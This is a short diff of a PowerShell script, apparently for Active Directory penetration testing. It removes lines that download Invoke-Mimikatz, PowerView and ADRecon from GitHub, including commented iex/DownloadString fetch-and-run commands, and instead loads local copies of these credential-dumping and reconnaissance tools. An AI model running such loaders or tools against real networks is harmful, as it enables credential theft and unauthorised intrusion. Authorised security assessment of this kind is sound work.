@@ -51,21 +51,15 @@ return (0..($UACPropertyFlags.Length) | ?{$UAC -bAnd [math]::Pow(2,$_)} | %{$UAC
 }
 
 # download mimikatz into memory
-Write-Host "[INFO] Downloading Mimikatz onto Disk" -ForegroundColor Gray
-#iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
-curl https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1 -o Invoke-Mimikatz.ps1
+Write-Host "[INFO] Loading Mimikatz" -ForegroundColor Gray
 . .\Invoke-Mimikatz.ps1
 
 # download powerview into memory
-Write-Host "[INFO] Downloading PowerView onto Disk" -ForegroundColor Gray
-#iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
-curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -o PowerView.ps1
+Write-Host "[INFO] Loading PowerView" -ForegroundColor Gray
 . .\PowerView.ps1
 
 # download adrecon into memory
-Write-Host "[INFO] Downloading ADRecon onto Disk" -ForegroundColor Gray
-#iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1')
-curl https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1 -o ADRecon.ps1
+Write-Host "[INFO] Loading ADRecon" -ForegroundColor Gray
 . .\ADRecon.ps1
 
 # print out domain context
